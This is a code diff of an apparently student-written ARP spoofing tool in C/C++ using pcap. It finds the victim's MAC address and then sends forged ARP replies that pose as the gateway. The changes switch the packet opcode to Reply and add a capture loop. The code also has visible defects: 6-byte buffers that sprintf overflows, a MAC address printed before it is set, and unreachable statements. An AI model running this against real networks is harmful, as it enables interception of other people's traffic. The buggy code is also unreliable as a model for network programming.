@@ -40,29 +40,22 @@ struct libnet_ethernet_hdr
     u_int16_t ether_type;
 };
 
-int My_IPAddress(char *ifname, char *ip_addr)
+int Get_My_Ip_Addr(char *ip_buffer)
 {
+    int fd;
     struct ifreq ifr;
-    int sockfd, ret;
-//----------------------------------------------------------------------------Open Net interface socket
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0){
-           printf("Fail to get interface IP - socket() failed - %m\n");
-           return -1;
-       }
-//----------------------------------------------------------------------------check the IP Address of Net interface
-       strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
-       ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
-       if (ret < 0) {
-           printf("Fail to get interface IP - ioctl(SIOSCIFHWARDDR) failed - %m\n");
-           close(sockfd);
-           return -1;
-       }
-       inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip_addr, sizeof(struct sockaddr));
-//-----------------------------------------------------------------------------Close interface socket
-       close(sockfd);
-       return 1;
 
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ -1);
+
+    ioctl(fd, SIOCGIFADDR, &ifr);
+    close(fd);
+
+    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+
+    return 0;
 }
 
 
@@ -111,14 +104,15 @@ void Send_ARPRequest(pcap_t *handle, char * my_ip , char *victim_IP, char *my_ma
     packet.arp_.smac_ = Mac(my_mac); // Hacker's Mac - internet search
     packet.arp_.sip_ = htonl(Ip(my_ip));      //Hacker's IP
     packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //victim Mac
-    packet.arp_.tip_ = htonl(Ip(victim_IP)); //argv[1]
+    packet.arp_.tip_ = htonl(Ip(victim_IP)); //argv[3]
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        exit(1);
     }
     pcap_close(handle);
-    printf("2");
+
 }
 
 void ARP_Spoofing(pcap_t *handle, char * victim_Mac ,char *victim_IP, char * target_ip ,char *my_mac) // ARP Spoofing
@@ -133,7 +127,7 @@ void ARP_Spoofing(pcap_t *handle, char * victim_Mac ,char *victim_IP, char * tar
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
-    packet.arp_.op_ = htons(ArpHdr::Request);
+    packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = Mac(my_mac); // Hacker's Mac
     packet.arp_.sip_ = htonl(Ip(target_ip));      // GateWay IP
     packet.arp_.tmac_ = Mac(victim_Mac); //victim Mac
@@ -159,15 +153,15 @@ int main(int argc, char* argv[]) {
     char* victim_ip = argv[2]; // victim ip
     char* target_ip = argv[3]; //gateway ip
 
-    char my_mac[20]; //mac size 6
-    char my_ip[20];
+    char my_mac[6]; //mac size 6
+    char my_ip[6];
 
 
 
     My_MacAddress(dev, my_mac); // mac_addr
     sprintf(my_mac,MAC_FMT, MAC_ARGS(my_mac)); //my mac save
     printf("My_MacAddress OK\n");
-    My_IPAddress(dev, my_ip); // ip_addr
+    Get_My_Ip_Addr(my_ip); // ip_addr
     printf("My_IPAddress OK\n");
 
 
@@ -189,32 +183,39 @@ int main(int argc, char* argv[]) {
     //GetInterfaceMACAddress_you(reply_handle, victim_Mac);
     Send_ARPRequest(handle, my_ip, victim_ip, my_mac);
     printf("Send_ARPRequest OK\n");
-while(1){
 
+while(1){
+    sleep(1);
     struct pcap_pkthdr* header;
-    const u_char* packet;
-    int res = pcap_next_ex(reply_handle,&header,&packet);
-    if (res == 0)
+    const u_char* reply_packet;
+    int res = pcap_next_ex(reply_handle,&header,&reply_packet);
+    if(res==0)continue;
     if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
     {
         printf("pcap_next_ex ERROR");
+        return 0;
+        break;
     }
 
-    struct libnet_ethernet_hdr* reply = (struct libnet_ethernet_hdr*) packet;
+    struct libnet_ethernet_hdr* reply = (struct libnet_ethernet_hdr*) reply_packet;
                 if(ntohs(reply->ether_type) == 0x0806)
                 {
                     char victim_Mac[20];
-                    sprintf(victim_Mac, MAC_FMT, reply->ether_shost[0], reply->ether_shost[1], reply->ether_shost[2], reply->ether_shost[3], reply->ether_shost[4], reply->ether_shost[5]);
+                    char test_Mac[20];
+                    printf("My Ip ADDR -> %s\n", my_ip);
                     printf("Victim MAC ADDR -> %s\n", victim_Mac);
+                    sprintf(victim_Mac, MAC_FMT, reply->ether_shost[0], reply->ether_shost[1], reply->ether_shost[2], reply->ether_shost[3], reply->ether_shost[4], reply->ether_shost[5]);
+                    sprintf(test_Mac,MAC_FMT, reply->ether_dhost[0], reply->ether_dhost[1], reply->ether_dhost[2], reply->ether_dhost[3], reply->ether_dhost[4], reply->ether_dhost[5]);
+                    printf("test MAC ADDR -> %s\n", test_Mac);
+                    printf("Victim MAC ADDR -> %s\n", victim_Mac);
+                    printf("Victim_ip -> %s\n",victim_ip);
+                    printf("target_ip -> %s\n",target_ip);
+
                     printf("My MAC ADDR -> %s\n",my_mac);
                     ARP_Spoofing(handle, victim_Mac, victim_ip, target_ip, my_mac);
                     printf("SUCCESS!\n");
-                    break;
-                }
-                else continue;
-        }
-
-
+                   }
+}
 
 
 
